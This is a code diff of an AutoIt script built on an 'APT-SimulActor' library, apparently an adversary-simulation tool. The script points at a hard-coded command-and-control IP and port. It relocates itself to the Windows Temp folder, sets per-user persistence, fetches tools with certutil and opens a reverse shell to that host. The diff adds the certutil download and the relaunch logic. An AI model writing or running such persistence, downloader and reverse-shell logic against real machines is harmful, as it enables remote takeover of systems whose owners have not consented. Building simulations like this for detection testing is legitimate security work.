@@ -1,8 +1,7 @@
-#include "APT-SimulActor.au3"
+#include <APT-SimulActor.au3>
 
 $c2_ip = "192.168.231.106"
 $c2_port = "444"
-$timer = 60
 
 init()
 
@@ -10,19 +9,19 @@ if InternetCheck() Then
 
    If numberOfLogins(whoami()) > 2 Then
 
-	  Move2Temp()
+	  if isRunningFromFolder("C:\WINDOWS\TEMP") Then
 
-	  SetPersistent4CurrentUser()
+		 SetPersistent4CurrentUser()
 
-	  While $timer > 0
+		 CertUtilDownloader($PSTools_URL)
 
-		 HttpPost($c2_ip, "Timer:", $timer)
-		 Sleep(1000)
- 		 $timer = $timer - 1
+		 ReverseShell($c2_ip, $c2_port)
 
-	  WEnd
+	  Else
 
-	  ReverseShell($c2_ip, $c2_port)
+		 MoveAndRunAgain("C:\WINDOWS\TEMP")
+
+	  EndIf
 
    EndIf
 
